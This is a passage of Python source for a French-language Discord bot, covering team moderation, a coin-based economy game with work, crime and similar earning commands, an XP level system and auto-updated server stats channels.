    if role_hierarchy.get(role, 0) <= role_hierarchy.get(target_role, 0):
        return await ctx.send(embed=discord.Embed(
            description="⚠️ Tu ne peux pas exclure un membre ayant un rôle égal ou supérieur au tien.",
            color=0xE67E22
        ))

    # Suppression du membre
    collection17.update_one(
        {"guild_id": guild_id, "team_id": team["team_id"]},
        {"$unset": {f"members.{target_id}": ""}}
    )

    # Embed de confirmation
    embed = discord.Embed(
        title="👢 Membre exclu",
        description=f"{member.mention} a été retiré de la team **{team.get('name', team['team_id'])}**.",
        color=0xE74C3C
    )
    embed.set_footer(text=f"Exclu par {ctx.author.display_name}")
    embed.set_thumbnail(url=ctx.author.avatar.url if ctx.author.avatar else discord.Embed.Empty)

    await ctx.send(embed=embed)


@bot.command()
async def tban(ctx, member: discord.Member):
    """Permet de bannir un membre de la team si autorisé."""

    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    target_id = str(member.id)
    guild_id = str(ctx.guild.id)

    team = collection17.find_one({"guild_id": guild_id, f"members.{user_id}": {"$exists": True}})

    if not team:
        return await ctx.send(embed=discord.Embed(
            description="❌ Tu ne fais partie d'aucune team.",
            color=0xE74C3C
        ))

    if target_id not in team.get("members", {}):
        return await ctx.send(embed=discord.Embed(
            description="🚫 Ce membre ne fait pas partie de ta team.",
            color=0xE67E22
        ))

    if target_id == user_id:
        return await ctx.send(embed=discord.Embed(
            description="🤨 Tu ne peux pas bannir toi-même.",
            color=0xF1C40F
        ))

    role = team["members"].get(user_id)
    target_role = team["members"].get(target_id)

    if role not in ["Second", "Owner"]:
        return await ctx.send(embed=discord.Embed(
            description="⛔ Tu n'as pas la permission de bannir un membre. (Il faut être **Second** ou **Owner**)",
            color=0xE74C3C
        ))

    # Bannissement du membre
    collection17.update_one(
        {"guild_id": guild_id, "team_id": team["team_id"]},
        {
            "$unset": {f"members.{target_id}": ""},
            "$addToSet": {"bans": target_id}
        }
    )

    # Embed de confirmation
    embed = discord.Embed(
        title="🚫 Membre Banni",
        description=f"{member.mention} a été **banni** de la team **{team.get('name', team['team_id'])}**.",
        color=0xE74C3C
    )
    embed.set_footer(text=f"Banni par {ctx.author.display_name}")
    embed.set_thumbnail(url=member.avatar.url if member.avatar else discord.Embed.Empty)

    await ctx.send(embed=embed)

@bot.command()
async def tunban(ctx, member: discord.Member):
    """Permet de débannir un membre de la team si autorisé."""

    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    target_id = str(member.id)
    guild_id = str(ctx.guild.id)

    team = collection17.find_one({"guild_id": guild_id, f"members.{user_id}": {"$exists": True}})

    if not team:
        return await ctx.send(embed=discord.Embed(
            description="❌ Tu ne fais pas partie d'aucune team.",
            color=0xE74C3C
        ))

    if target_id not in team.get("bans", []):
        return await ctx.send(embed=discord.Embed(
            description="🚫 Ce membre n'est pas banni de ta team.",
            color=0xE67E22
        ))

    role = team["members"].get(user_id)

    if role not in ["Second", "Owner"]:
        return await ctx.send(embed=discord.Embed(
            description="⛔ Tu n'as pas la permission de débannir un membre. (Il faut être **Second** ou **Owner**)",
            color=0xE74C3C
        ))

    # Débannissement du membre
    collection17.update_one(
        {"guild_id": guild_id, "team_id": team["team_id"]},
        {"$pull": {"bans": target_id}}
    )

    # Embed de confirmation
    embed = discord.Embed(
        title="✅ Membre Débanni",
        description=f"{member.mention} a été **débanni** de la team **{team.get('name', team['team_id'])}**.",
        color=0x2ECC71
    )
    embed.set_footer(text=f"Débanni par {ctx.author.display_name}")
    embed.set_thumbnail(url=member.avatar.url if member.avatar else discord.Embed.Empty)

    await ctx.send(embed=embed)

@bot.command()
async def tleave(ctx):
    """Permet à un membre de quitter sa team."""

    if not check_project_delta(ctx):
        return

    user_id = str(ctx.author.id)
    guild_id = str(ctx.guild.id)

    # Recherche de l'équipe à partir de l'ID du membre
    team = collection17.find_one({f"members.{user_id}": {"$exists": True}, "guild_id": guild_id})

    if not team:
        return await ctx.send(embed=discord.Embed(
            description="❌ Tu n'es dans aucune team.",
            color=0xE74C3C
        ))

    owner_id = team.get("owner")

    # Si le membre est le propriétaire de la team
    if owner_id == user_id:
        collection17.delete_one({"_id": team["_id"]})
        embed = discord.Embed(
            title="🏆 Team Supprimée",
            description="👑 Tu étais le propriétaire de la team. En conséquence, la team a été supprimée.",
            color=0xE74C3C
        )
        embed.set_footer(text=f"Action réalisée par {ctx.author.display_name}")
        return await ctx.send(embed=embed)

    # Si le membre n'est pas le propriétaire, on le retire de la team
    collection17.update_one(
        {"_id": team["_id"]},
        {"$unset": {f"members.{user_id}": ""}}
    )

    embed = discord.Embed(
        title="✅ Quitter la Team",
        description=f"{ctx.author.mention} a quitté la team **{team['team_id']}** avec succès.",
        color=0x2ECC71
    )
    embed.set_footer(text=f"Action réalisée par {ctx.author.display_name}")
    await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(administrator=True)
async def clean_teams(ctx):
    """Supprime les teams sans propriétaire."""
    
    if not check_project_delta(ctx):
        return

    # Recherche des teams sans propriétaire
    teams_without_owner = collection17.find({"owner_id": {"$exists": False}})
    deleted_teams_count = 0

    # Traitement des teams sans propriétaire
    for team in teams_without_owner:
        collection17.delete_one({"_id": team["_id"]})
        deleted_teams_count += 1

    # Retour visuel selon le résultat
    if deleted_teams_count > 0:
        embed = discord.Embed(
            title="✅ Suppression des Teams",
            description=f"{deleted_teams_count} team(s) sans propriétaire ont été supprimées avec succès.",
            color=0x2ECC71
        )
        embed.set_footer(text=f"Action réalisée par {ctx.author.display_name}")
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="❌ Aucune Team à Supprimer",
            description="Aucune team sans propriétaire n'a été trouvée dans ce serveur.",
            color=0xE74C3C
        )
        embed.set_footer(text=f"Action réalisée par {ctx.author.display_name}")
        await ctx.send(embed=embed)

@bot.tree.command(name="reset_teams", description="⚠️ Supprime toutes les teams (réservé à l'admin).")
async def reset_teams(interaction: discord.Interaction):
    # Vérification que l'utilisateur est bien l'admin autorisé
    if interaction.user.id != 792755123587645461:
        return await interaction.response.send_message(
            "❌ Tu n'es pas autorisé à utiliser cette commande.", ephemeral=True
        )

    try:
        # Suppression de toutes les teams dans la collection
        result = collection17.delete_many({})
        
        # Réponse de succès avec nombre de documents supprimés
        if result.deleted_count > 0:
            await interaction.response.send_message(
                f"🧹 Toutes les teams ont été supprimées avec succès ! ({result.deleted_count} documents supprimés).",
                ephemeral=True
            )
        else:
            # Si aucune team n'a été supprimée (cas où il n'y avait pas de teams)
            await interaction.response.send_message(
                "❗ Aucune team n'a été trouvée à supprimer.", ephemeral=True
            )

    except Exception as e:
        # Gestion d'erreur en cas de problème avec la suppression
        await interaction.response.send_message(
            f"⚠️ Une erreur est survenue lors de la suppression des teams. Détails : {str(e)}", ephemeral=True
        )


#--------------------------------------------------------------------------- Eco:
def has_eco_vip_role():
    async def predicate(ctx):
        if any(role.id in ECO_ROLES_VIP for role in ctx.author.roles):
            return True
        else:
            await ctx.send("⛔ Vous n'avez pas les permissions nécessaires pour utiliser cette commande.")
            return False
    return commands.check(predicate)

def check_guild():
    def decorator(func):
        @wraps(func)
        async def wrapper(ctx, *args, **kwargs):
            if ctx.guild is None or ctx.guild.id != PROJECT_DELTA:
                await ctx.send("❌ **Les commandes économiques ne sont pas autorisées sur ce serveur.**")
                return
            return await func(ctx, *args, **kwargs)
        return wrapper
    return decorator

# Fonction pour ajouter des coins à un utilisateur
def add_coins(guild_id, user_id, amount):
    collection10.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$inc": {"coins": amount}},  # Ajout uniquement aux coins
        upsert=True
    )

# Commande pour afficher le solde de coins d'un utilisateur
@bot.hybrid_command(name="balance", description="Affiche ton solde de Coins.", aliases=['bal'])
@check_guild()
async def balance(ctx, member: discord.Member = None):
    if ctx.guild.id != 1359963854200639498:
        return

    member = member or ctx.author
    user_id = str(member.id)
    guild_id = str(ctx.guild.id)

    user_data = get_user_eco(guild_id, user_id)
    coins = user_data.get("coins", 0)

    embed = discord.Embed(
        title=f"💼 Portefeuille de {member.display_name}",
        color=discord.Color.blue(),
        description="Voici ton solde actuel :"
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="💰 Coins", value=f"`{coins}` <:ecoEther:1341862366249357374>", inline=True)
    embed.set_footer(text="Économie de Project : Delta")

    await ctx.send(embed=embed)

# Commande pour afficher le classement des utilisateurs par nombre de coins
@bot.hybrid_command(name="leaderboard", aliases=["lb"], description="Affiche le classement des plus riches.")
@check_guild()
async def leaderboard(ctx, tri: str = None):
    if ctx.guild.id != 1359963854200639498:
        return

    guild_id = str(ctx.guild.id)
    users = list(collection10.find({"guild_id": guild_id}))

    # Tri des utilisateurs par nombre de coins décroissant
    users.sort(key=lambda u: u.get("coins", 0), reverse=True)

    title = "🏆 Classement par Coins"
    description = ""
    for i, u in enumerate(users[:10]):
        member = ctx.guild.get_member(int(u["user_id"]))
        name = member.display_name if member else f"Utilisateur inconnu ({u['user_id']})"
        value = u.get("coins", 0)
        formatted = f"{value:,}".replace(",", " ")  # Séparation des milliers avec un espace insécable
        description += f"**{i+1}. {name}** • <:ecoEther:1341862366249357374> {formatted}\n"

    embed = discord.Embed(
        title=title,
        description=description or "Aucun utilisateur n’a encore de coins.",
        color=discord.Color.gold()
    )
    await ctx.send(embed=embed)

@bot.hybrid_command(name="pay", description="Permet de transférer une certaine somme de Coins à un autre utilisateur.")
@check_guild()
async def pay(ctx, member: discord.Member, amount: int = None):
    if ctx.guild.id != 1359963854200639498:
        return

    if amount is None or amount <= 0:
        return await ctx.send("❌ **Montant invalide.** Utilise une somme positive pour effectuer un paiement.")

    if member == ctx.author:
        return await ctx.send("⚠️ Tu ne peux pas te payer toi-même.")

    user_id, member_id, guild_id = str(ctx.author.id), str(member.id), str(ctx.guild.id)
    user_data = collection10.find_one({"guild_id": guild_id, "user_id": user_id}) or {"coins": 0}

    if user_data["coins"] < amount:
        return await ctx.send("💸 Tu n'as pas assez de **coins** pour effectuer ce paiement.")

    collection10.update_one({"guild_id": guild_id, "user_id": user_id}, {"$inc": {"coins": -amount}}, upsert=True)
    collection10.update_one({"guild_id": guild_id, "user_id": member_id}, {"$inc": {"coins": amount}}, upsert=True)

    embed = discord.Embed(
        title="💸 Paiement envoyé !",
        description=f"Tu as envoyé **{amount} <:ecoEther:1341862366249357374>** à {member.mention}.",
        color=discord.Color.green()
    )
    embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.display_avatar.url)
    embed.set_footer(text="Transaction réussie.")
    await ctx.send(embed=embed)

@pay.error
async def pay_all_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        user_id = str(ctx.author.id)
        guild_id = str(ctx.guild.id)
        user_data = collection10.find_one({"guild_id": guild_id, "user_id": user_id}) or {"cash": 0}

        total_cash = user_data.get("cash", 0)
        if total_cash <= 0:
            await ctx.send("❌ Tu n'as pas assez de **<:ecoEther:1341862366249357374>** en cash pour payer.")
            return
        
        await pay(ctx, ctx.author, total_cash)

@bot.hybrid_command(name="daily", description="Réclamez votre récompense quotidienne de Coins. Disponible tous les 24h.", aliases=['dy'])
@check_guild()
@commands.cooldown(1, 5, commands.BucketType.user)
async def daily(ctx):
    user_id, guild_id = str(ctx.author.id), str(ctx.guild.id)
    now, cooldown = datetime.utcnow(), timedelta(hours=24)

    last_daily = collection11.find_one({"guild_id": guild_id, "user_id": user_id})
    if last_daily and (now - datetime.fromisoformat(last_daily.get("last_daily", "")) < cooldown):
        remaining = cooldown - (now - datetime.fromisoformat(last_daily["last_daily"]))
        h, rem = divmod(remaining.total_seconds(), 3600)
        m, s = divmod(rem, 60)
        return await ctx.send(
            f"⏳ Tu as déjà réclamé ton daily.\nReviens dans **{int(h)}h {int(m)}m {int(s)}s**."
        )

    reward = random.randint(1, 250)

    collection10.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$inc": {"coins": reward}},
        upsert=True
    )
    collection11.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$set": {"last_daily": now.isoformat()}},
        upsert=True
    )

    await ctx.send(
        embed=discord.Embed(
            title="🎁 Récompense quotidienne",
            description=f"Tu as reçu **{reward} <:ecoEther:1341862366249357374>** !",
            color=discord.Color.blurple()
        ).set_author(name=ctx.author.display_name, icon_url=ctx.author.display_avatar.url)
    )

# Liste des messages à renvoyer
messages = [
    "Tu négocies une augmentation avec succès. 💹 <:ecoEther:1341862366249357374> {coins}",
    "Tu as travaillé dur et ça a payé ! 💼 <:ecoEther:1341862366249357374> {coins}",
    "Le boss est satisfait de tes efforts, tu gagnes une prime ! 💸 <:ecoEther:1341862366249357374> {coins}",
    "Tu as bien géré tes tâches, voilà ta récompense ! 🏆 <:ecoEther:1341862366249357374> {coins}",
    "Une journée bien remplie, et voilà ta compensation ! 💪 <:ecoEther:1341862366249357374> {coins}",
    "Tu fais une présentation brillante et ça se reflète dans ton salaire. 📊 <:ecoEther:1341862366249357374> {coins}",
    "Le patron t'a bien vu en action, récompensé pour ta productivité ! ⚡ <:ecoEther:1341862366249357374> {coins}",
    "Tes efforts sont remarqués et ta récompense suit ! 👔 <:ecoEther:1341862366249357374> {coins}",
    "Tu as pris une initiative, et ça n'est pas passé inaperçu ! 🎯 <:ecoEther:1341862366249357374> {coins}",
    "Tu as géré la situation avec brio, et la récompense suit ! 🔥 <:ecoEther:1341862366249357374> {coins}"
]

@bot.hybrid_command(name="work", description="Gagnez des coins en travaillant. Vous pouvez le faire toutes les 6 heures.", aliases=['wk'])
@check_guild()
@has_eco_vip_role()
async def work(ctx):
    guild_id = str(ctx.guild.id)
    user_id = str(ctx.author.id)
    
    # Récupère les données de travail de l'utilisateur pour vérifier le cooldown
    eco_work_data = collection13.find_one({"guild_id": guild_id, "user_id": user_id})

    # Vérifie le cooldown
    if eco_work_data and eco_work_data.get('last_work'):
        last_work_time = eco_work_data['last_work']
        cooldown_time = timedelta(hours=6)
        if datetime.utcnow() - last_work_time < cooldown_time:
            time_left = cooldown_time - (datetime.utcnow() - last_work_time)

            # Formate l'heure restante en heures et minutes (sans les secondes)
            time_left_str = str(time_left).split(".")[0]  # Enlève les millisecondes
            
            embed = Embed(
                title="Cooldown Travail",
                description=f"Tu dois attendre encore {time_left_str} avant de pouvoir travailler à nouveau.",
                color=0xFF0000  # Rouge pour indiquer l'attente
            )
            await ctx.send(embed=embed)
            return

    # Génère le nombre de coins entre 1 et 150
    coins = random.randint(1, 150)

    # Choisis un message aléatoire parmi les 10 phrases
    message = random.choice(messages).format(coins=coins)

    # Met à jour ou insère les données de travail de l'utilisateur avec la date du dernier travail
    collection13.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$set": {"last_work": datetime.utcnow()}},
        upsert=True
    )

    # Récupère les données économiques actuelles de l'utilisateur
    user_data = get_user_eco(guild_id, user_id)
    new_coins = user_data["coins"] + coins

    # Met à jour la collection eco avec le nouveau nombre de coins
    collection10.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$set": {"coins": new_coins}},
        upsert=True
    )

    # Crée un Embed pour afficher la récompense de manière agréable
    embed = Embed(
        title="Récompense du Travail",
        description=message,
        color=0x00FF00  # Vert pour la récompense
    )
    embed.add_field(name="Coins Gagnés", value=f"{coins} <:ecoEther:1341862366249357374>", inline=True)
    embed.add_field(name="Total de Coins", value=f"{new_coins} <:ecoEther:1341862366249357374>", inline=True)
    embed.set_footer(text=f"Travail effectué par {ctx.author.name}", icon_url=ctx.author.avatar.url)

    # Envoie le message avec l'embed
    await ctx.send(embed=embed)

# Liste des messages à renvoyer pour "slut"
messages = [
    "Tu as réussi à attirer l'attention et tu gagnes une récompense ! 💋 <:ecoEther:1341862366249357374> {coins}",
    "T'as assuré, voilà ta prime ! 💄 <:ecoEther:1341862366249357374> {coins}",
    "Ton charme fait des miracles ! 💅 <:ecoEther:1341862366249357374> {coins}",
    "Tu as fait des merveilles, récompensée comme il se doit ! 💋 <:ecoEther:1341862366249357374> {coins}",
    "Félicitations, tu as remporté ta récompense ! 💃 <:ecoEther:1341862366249357374> {coins}",
    "Le regard des autres t'a permis de récolter des Coins ! 👀 <:ecoEther:1341862366249357374> {coins}",
    "C'est ta chance, tu récoltes ce que tu mérites ! 💋 <:ecoEther:1341862366249357374> {coins}",
    "Un petit effort et voilà ta récompense ! 💖 <:ecoEther:1341862366249357374> {coins}",
    "Tu as su charmer tout le monde, et ça se voit dans ta prime ! 💋 <:ecoEther:1341862366249357374> {coins}",
    "Avec un peu d'effort, tu as mérité ta récompense ! 👠 <:ecoEther:1341862366249357374> {coins}"
]

@bot.hybrid_command(name="slut", description="Gagnez des coins en attirant l'attention. Vous pouvez le faire toutes les 3 heures.")
@has_eco_vip_role()
@check_guild()
async def slut(ctx):
    guild_id = str(ctx.guild.id)
    user_id = str(ctx.author.id)

    # Récupère les données de la commande "slut" pour vérifier le cooldown
    eco_slut_data = collection14.find_one({"guild_id": guild_id, "user_id": user_id})

    # Vérifie le cooldown
    if eco_slut_data and eco_slut_data.get('last_slut'):
        last_slut_time = eco_slut_data['last_slut']
        cooldown_time = timedelta(hours=3)
        if datetime.utcnow() - last_slut_time < cooldown_time:
            time_left = cooldown_time - (datetime.utcnow() - last_slut_time)
            time_left_str = str(time_left).split(".")[0]

            embed = Embed(
                title="Cooldown Slut",
                description=f"Tu dois attendre encore {time_left_str} avant de pouvoir recommencer.",
                color=0xFF0000
            )
            await ctx.send(embed=embed)
            return

    # Détermine si le joueur gagne (50% de chances)
    success = random.choice([True, False])

    # Récupère les données économiques actuelles de l'utilisateur
    user_data = get_user_eco(guild_id, user_id)
    current_coins = user_data["coins"]

    if success:
        coins = random.randint(1, 75)
        new_coins = current_coins + coins
        message = random.choice(messages).format(coins=coins)
        color = 0x00FF00
        result_title = "✨ Séduction Réussie"
        coins_field = ("Coins Gagnés", f"{coins} <:ecoEther:1341862366249357374>")
    else:
        coins = random.randint(1, 75)
        new_coins = max(0, current_coins - coins)
        message = f"Tu t’es ridiculisé·e… et tu perds {coins} <:ecoEther:1341862366249357374> 😔"
        color = 0x8B0000
        result_title = "💔 Échec de Séduction"
        coins_field = ("Coins Perdus", f"-{coins} <:ecoEther:1341862366249357374>")

    # Met à jour la base de données
    collection14.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$set": {"last_slut": datetime.utcnow()}},
        upsert=True
    )
    collection10.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$set": {"coins": new_coins}},
        upsert=True
    )

    # Crée l'embed
    embed = Embed(
        title=result_title,
        description=message,
        color=color
    )
    embed.add_field(name=coins_field[0], value=coins_field[1], inline=True)
    embed.add_field(name="Total de Coins", value=f"{new_coins} <:ecoEther:1341862366249357374>", inline=True)
    embed.set_footer(text=f"Action effectuée par {ctx.author.name}", icon_url=ctx.author.avatar.url)

    await ctx.send(embed=embed)

# Liste des messages aléatoires pour la commande crime
crime_messages = [
    "Tu as volé un sac à main en pleine rue. 👜 💸 Tu repars avec {coins} <:ecoEther:1341862366249357374>",
    "Coup de maître ! Tu as piraté un distributeur. 🖥️ 💰 Gagné : {coins} <:ecoEther:1341862366249357374>",
    "Braquage express chez un marchand de bonbons... 🍬 Ce n’est pas glorieux, mais tu prends {coins} <:ecoEther:1341862366249357374>",
    "Tu fais un cambriolage chez un riche collectionneur d’art. 🖼️ Récompense : {coins} <:ecoEther:1341862366249357374>",
    "Tu as racketté un passant un peu trop naïf. 😈 Tu obtiens {coins} <:ecoEther:1341862366249357374>",
    "Tu as volé une voiture… et trouvé un portefeuille dedans ! 🚗💳 Jackpot : {coins} <:ecoEther:1341862366249357374>",
    "Tu as fraudé les impôts comme un pro. 📄💼 Récompense : {coins} <:ecoEther:1341862366249357374>",
    "Petit vol à l’étalage, personne ne t’a vu. 🛒 Tu repars avec {coins} <:ecoEther:1341862366249357374>",
    "Tu as cambriolé un casino, risqué mais rentable ! 🎰 Gains : {coins} <:ecoEther:1341862366249357374>",
    "Casse éclair dans une bijouterie ! 💎 Tu fuis avec {coins} <:ecoEther:1341862366249357374>"
]

@bot.hybrid_command(name="crime", description="Tente un coup illégal pour gagner des coins ! (1h de cooldown).")
@has_eco_vip_role()
@check_guild()
async def crime(ctx):
    guild_id = str(ctx.guild.id)
    user_id = str(ctx.author.id)

    # Vérifie le cooldown
    crime_data = collection15.find_one({"guild_id": guild_id, "user_id": user_id})
    if crime_data and crime_data.get("last_crime"):
        last_crime_time = crime_data["last_crime"]
        cooldown = timedelta(hours=1)

        if datetime.utcnow() - last_crime_time < cooldown:
            time_left = cooldown - (datetime.utcnow() - last_crime_time)
            time_left_str = str(time_left).split(".")[0]

            embed = Embed(
                title="⏳ Trop Tôt !",
                description=f"Tu dois attendre encore {time_left_str} avant de retenter un coup.",
                color=0xFF0000
            )
            await ctx.send(embed=embed)
            return

    # Génère une chance sur 2 pour déterminer si le joueur gagne ou perd
    success = random.choice([True, False])

    if success:
        # Génère un nombre de coins entre 1 et 50 pour les gains
        coins = random.randint(1, 50)
        message = random.choice(crime_messages).format(coins=coins)
    else:
        # Génère une perte de coins entre 1 et 50
        coins = random.randint(1, 50) * -1  # Négatif pour une perte
        message = f"Échec de ton coup, tu perds {abs(coins)} <:ecoEther:1341862366249357374>."

    # Met à jour le temps du dernier crime
    collection15.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$set": {"last_crime": datetime.utcnow()}},
        upsert=True
    )

    # Récupère les infos économiques de l'utilisateur
    user_data = get_user_eco(guild_id, user_id)
    new_coins = user_data["coins"] + coins

    # Met à jour la collection eco avec les nouveaux coins
    collection10.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$set": {"coins": new_coins}},
        upsert=True
    )

    # Embed de retour
    embed = Embed(
        title="💣 Crime Commis",
        description=message,
        color=0x8B0000 if not success else 0x00FF00  # Rouge si échec, vert si succès
    )
    embed.add_field(name="Coins Gagnés/Perdus", value=f"{abs(coins)} <:ecoEther:1341862366249357374>", inline=True)
    embed.add_field(name="Total de Coins", value=f"{new_coins} <:ecoEther:1341862366249357374>", inline=True)
    embed.set_footer(text=f"Crime exécuté par {ctx.author.name}", icon_url=ctx.author.avatar.url)

    await ctx.send(embed=embed)

@bot.hybrid_command(name="reset_eco_all", description="Réinitialise toute l'économie des utilisateurs (Admin Only)")
@check_guild()
async def reset_eco_all(ctx):
    if ctx.author.id != 792755123587645461:
        return await ctx.send("🚫 Tu n'as pas la permission d’utiliser cette commande.")

    # Suppression complète de tous les documents dans la collection
    result = collection10.delete_many({})

    await ctx.send(
        embed=discord.Embed(
            title="💣 Réinitialisation complète de l'économie",
            description=f"✅ Toute l'économie a été réinitialisée.\n**{result.deleted_count}** documents supprimés.",
            color=discord.Color.red()
        )
    )


# Commande pour ajouter des coins à un utilisateur
@bot.tree.command(name="add_money", description="Ajoute de l'argent à un utilisateur")
@app_commands.describe(user="Utilisateur à qui ajouter des coins", amount="Montant à ajouter")
async def add_money(interaction: discord.Interaction, user: discord.Member, amount: int):
    if interaction.guild.id != PROJECT_DELTA:
        return await interaction.response.send_message(
            "❌ **Les commandes économiques ne sont pas autorisées sur ce serveur.**", ephemeral=True
        )

    if amount <= 0:
        return await interaction.response.send_message("❌ **Montant invalide.** Utilise une somme positive.", ephemeral=True)

    user_id, guild_id = str(user.id), str(interaction.guild.id)

    collection10.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$inc": {"coins": amount}},
        upsert=True
    )

    embed = discord.Embed(
        title="💰 Coins ajoutés avec succès",
        description=f"**{amount} <:ecoEther:1341862366249357374>** ont été ajoutés à {user.mention}.",
        color=discord.Color.green()
    )
    embed.set_author(name=interaction.user.display_name, icon_url=interaction.user.display_avatar.url)
    embed.set_footer(text="Transaction réussie.")
    await interaction.response.send_message(embed=embed)

# Commande pour retirer des coins à un utilisateur
@bot.tree.command(name="remove_money", description="Retire de l'argent à un utilisateur")
@app_commands.describe(user="Utilisateur à qui retirer des coins", amount="Montant à retirer")
async def remove_money(interaction: discord.Interaction, user: discord.Member, amount: int):
    if interaction.guild.id != PROJECT_DELTA:
        return await interaction.response.send_message(
            "❌ **Les commandes économiques ne sont pas autorisées sur ce serveur.**", ephemeral=True
        )

    if amount <= 0:
        return await interaction.response.send_message("❌ **Montant invalide.** Utilise une somme positive.", ephemeral=True)

    user_id, guild_id = str(user.id), str(interaction.guild.id)

    collection10.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$inc": {"coins": -amount}},
        upsert=True
    )

    embed = discord.Embed(
        title="💸 Coins retirés avec succès",
        description=f"**{amount} <:ecoEther:1341862366249357374>** ont été retirés à {user.mention}.",
        color=discord.Color.red()
    )
    embed.set_author(name=interaction.user.display_name, icon_url=interaction.user.display_avatar.url)
    embed.set_footer(text="Transaction réussie.")
    await interaction.response.send_message(embed=embed)

#-------------------------------------------------------------------------------- Niveau:

xp_rate = {
    "message": 5,
    "voice": 15,
    "camera": 25,
    "stream": 15
}

def xp_needed_for_level(level):
    base_xp = 150
    return base_xp * (2 ** (level - 1))

# Affichage des niveaux 1 à 500
for lvl in range(1, 501):
    print(f"Niveau {lvl} : {xp_needed_for_level(lvl):,} XP".replace(",", " "))

def get_user_rank_data(guild_id, user_id):
    user_id, guild_id = str(user_id), str(guild_id)
    data = collection12.find_one({"guild_id": guild_id, "user_id": user_id})
    if not data:
        collection12.insert_one({"guild_id": guild_id, "user_id": user_id, "xp": 0, "level": 1})
        return {"xp": 0, "level": 1}
    return data

def update_user_xp(guild_id, user_id, xp_gain):
    user_id, guild_id = str(user_id), str(guild_id)
    data = get_user_rank_data(guild_id, user_id)
    new_xp = data["xp"] + xp_gain
    new_level = data["level"]

    while new_xp >= xp_needed_for_level(new_level + 1):
        new_level += 1
        add_coins(guild_id, user_id, new_level * 100)  # 💰 100 coins par niveau gagné

    collection12.update_one(
        {"guild_id": guild_id, "user_id": user_id},
        {"$set": {"xp": new_xp, "level": new_level}},
        upsert=True
    )

@bot.hybrid_command(name="rank", description= "Affichez votre niveau actuel et votre progression dans le système de classement.", aliases=['level', 'lvl'])
async def rank(ctx, member: discord.Member = None):
    member = member or ctx.author
    guild_id = str(ctx.guild.id)
    user_id = str(member.id)

    data = get_user_rank_data(guild_id, user_id)
    xp = data["xp"]
    level = data["level"]
    next_level_xp = xp_needed_for_level(level + 1)
    
    embed = discord.Embed(
        title=f"🏅 Rang de {member.display_name}",
        color=discord.Color.gold(),
        description=f"**Niveau :** {level}\n**XP :** {xp} / {next_level_xp}"
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    await ctx.send(embed=embed)

@bot.tree.command(name="add_xp")
async def add_xp(interaction: discord.Interaction, member: discord.Member, xp_amount: int):
    guild_id = str(interaction.guild.id)
    user_id = str(member.id)

    # Mise à jour de l'XP de l'utilisateur
    update_user_xp(guild_id, user_id, xp_amount)

    # Réponse confirmant l'ajout d'XP
    await interaction.response.send_message(f"{member.mention} a reçu {xp_amount} XP ! 🎉", ephemeral=True)

@bot.tree.command(name="remove_xp")
async def remove_xp(interaction: discord.Interaction, member: discord.Member, xp_amount: int):
    guild_id = str(interaction.guild.id)
    user_id = str(member.id)

    # Mise à jour de l'XP de l'utilisateur
    data = get_user_rank_data(guild_id, user_id)
    current_xp = data["xp"]

    # S'assurer qu'on ne retire pas plus d'XP que ce que l'utilisateur possède
    if xp_amount > current_xp:
        await interaction.response.send_message(f"{member.mention} n'a pas assez d'XP pour retirer cette quantité.", ephemeral=True)
        return

    # Mise à jour de l'XP de l'utilisateur après retrait
    update_user_xp(guild_id, user_id, -xp_amount)

    # Réponse confirmant le retrait d'XP
    await interaction.response.send_message(f"{xp_amount} XP ont été retirés à {member.mention}. 😔", ephemeral=True)

@bot.command(name="reset_all_rank")
async def reset_all_rank(ctx):
    if ctx.author.id != 792755123587645461:
        return await ctx.send("🚫 Tu n'as pas la permission d'utiliser cette commande.")

    result = collection12.delete_many({"guild_id": str(ctx.guild.id)})
    await ctx.send(f"✅ Toutes les données de rang ont été supprimées pour ce serveur. ({result.deleted_count} entrées supprimées)")

#--------------------------------------------------------------------------- Stats

@bot.tree.command(name="stats", description="Crée des salons de stats mis à jour automatiquement")
@discord.app_commands.describe(role="Le rôle à suivre dans les stats")
async def stats(interaction: discord.Interaction, role: discord.Role):
    guild = interaction.guild
    user = interaction.user

    # Vérification des permissions
    if not user.guild_permissions.administrator and user.id != 792755123587645461:
        await interaction.response.send_message("❌ Tu n'as pas la permission d'utiliser cette commande.", ephemeral=True)
        return

    stats_data = collection9.find_one({"guild_id": str(guild.id)})

    if stats_data:
        collection9.update_one(
            {"guild_id": str(guild.id)},
            {"$set": {"role_id": role.id}}
        )
        await interaction.response.send_message(f"🔁 Rôle mis à jour pour les stats : {role.name}", ephemeral=True)
        return

    try:
        member_channel = await guild.create_voice_channel(name="👥 Membres : 0")
        role_channel = await guild.create_voice_channel(name=f"✨ {role.name} : 0")
        bots_channel = await guild.create_voice_channel(name="🤖 Bots : 0")

        collection9.insert_one({
            "guild_id": str(guild.id),
            "member_channel_id": member_channel.id,
            "role_channel_id": role_channel.id,
            "bots_channel_id": bots_channel.id,
            "role_id": role.id
        })

        await interaction.response.send_message("📊 Salons de stats créés et synchronisés !", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("❌ Je n'ai pas les permissions pour créer des salons.", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"❌ Une erreur est survenue : {e}", ephemeral=True)

@bot.tree.command(name="reset_stats", description="Réinitialise les salons de stats")
async def reset_stats(interaction: discord.Interaction):
    author = interaction.user

    # Vérification des permissions
    if not author.guild_permissions.administrator and author.id != 792755123587645461:
        await interaction.response.send_message("❌ Tu n'as pas la permission d'utiliser cette commande.", ephemeral=True)
        return

    guild = interaction.guild
